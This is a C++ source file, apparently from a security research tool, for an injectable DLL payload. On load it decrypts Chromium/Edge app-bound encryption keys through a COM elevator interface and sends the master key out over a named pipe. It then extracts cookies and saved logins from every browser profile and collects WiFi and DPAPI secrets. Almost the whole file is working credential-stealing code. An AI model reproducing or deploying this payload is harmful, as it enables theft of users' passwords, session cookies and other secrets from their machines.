// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "extra_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>
#include <iostream>
#include <iomanip>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState,
    const std::string& keyName,
    std::string* errorMsg = nullptr) {
    std::cout << "[src/payload/payload_main] [+] keyName : ";

    for (const auto& b : keyName)
    {
        std::cout << static_cast<int>(b) << ' ';
    }

    std::cout << '\n';

    std::ifstream f(localState, std::ios::binary);
    if (!f) {
        if (errorMsg) *errorMsg = " ";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) {
        if (errorMsg) *errorMsg = "";
        return {};
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) {
        if (errorMsg) *errorMsg = " ";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5) {
        if (errorMsg) *errorMsg = " ";
        return {};
    }

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

std::string KeyToHex(const std::vector<uint8_t>& key) {
    std::string hex;
    for (auto b : key) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}
DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);

            if (!Sys::InitApi(config.verbose)) {
            }

            // --- ABE key extraction ---
            std::string error;
            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State",
                "app_bound_encrypted_key", &error);
            std::vector<uint8_t> masterKey;
            std::cout << "[src/payload/payload_main] [+] encKey : ";

            for (const auto& b : encKey)
            {
                std::cout << std::hex
                    << std::setw(2)
                    << std::setfill('0')
                    << static_cast<int>(b);
            }

            std::cout << std::dec << '\n';
            if (!encKey.empty()) {
                Com::Elevator elevator;
                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid,
                    browser.iid_v2, browser.name == "Edge",
                    browser.name == "Avast");
                std::cout << "[src/payload/payload_main] [+] masterKey : ";

                for (const auto& b : masterKey)
                {
                    std::cout << std::hex
                        << std::setw(2)
                        << std::setfill('0')
                        << static_cast<int>(b);
                }

                std::cout << std::dec << '\n';
                pipe.Log("KEY:" + KeyToHex(masterKey));
                pipe.LogDebug("Master key size: " + std::to_string(masterKey.size()));

                if (browser.name == "Edge") {
                    auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State",
                        "aster_app_bound_encrypted_key");
                    std::cout << "[src/payload/payload_main] [+] asterEncKey : ";

                    for (const auto& b : asterEncKey)
                    {
                        std::cout << std::hex
                            << std::setw(2)
                            << std::setfill('0')
                            << static_cast<int>(b);
                    }

                    std::cout << std::dec << '\n';

                    if (!asterEncKey.empty()) {
                        try {
                            Com::Elevator elevator;
                            auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid,
                                browser.iid);
                            pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
                        }
                        catch (...) {}
                    }
                }
            }
            else {
                auto legacyKey = GetEncryptedKeyByName(browser.userDataPath / "Local State",
                    "encrypted_key");
                std::cout << "[src/payload/payload_main] [+] legacyKey : ";

                for (const auto& b : legacyKey)
                {
                    std::cout << std::hex
                        << std::setw(2)
                        << std::setfill('0')
                        << static_cast<int>(b);
                }

                std::cout << std::dec << '\n';

                if (!legacyKey.empty()) {
                }
                else {
                }
                FreeLibraryAndExitThread(hModule, 0);
                return 0;
            }

            // --- Browser data extraction ---
            DataExtractor extractor(pipe, masterKey, config.outputPath);
            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                try {
                    if (entry.is_directory() &&
                        (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                            std::filesystem::exists(entry.path() / "Login Data"))) {
                        extractor.ProcessProfile(entry.path(), browser.name);
                    }
                }
                catch (...) {}
            }

            // --- Fingerprint (if requested) ---
            if (config.fingerprint) {
                try {
                    FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                    fingerprinter.Extract();
                }
                catch (...) {}
            }

            // --- Extra secrets (WiFi, DPAPI, etc.) – written once ---
            try {
                std::filesystem::path outputDir(config.outputPath);
                std::filesystem::path extraPath = outputDir / "extra.json";

                if (!std::filesystem::exists(extraPath)) {
                    ExtraExtractor extras(pipe);
                    extras.CollectAll();
                    std::string extraJson = extras.GetSecretsJson();

                    // Write atomically
                    auto tmpExtra = extraPath.string() + ".tmp";
                    std::ofstream extraFile(tmpExtra, std::ios::out | std::ios::trunc | std::ios::binary);
                    if (extraFile.is_open()) {
                        extraFile << extraJson;
                        extraFile.close();
                        if (extraFile.good()) {
                            std::filesystem::rename(tmpExtra, extraPath);
                        }
                        else {
                            std::filesystem::remove(tmpExtra);
                        }
                    }
                    else {
                    }
                }
                else {
                }
            }
            catch (const std::exception&) {
            }
            catch (...) {
            }

        }
        catch (const std::exception&) {
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{ hModule, lpReserved };
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
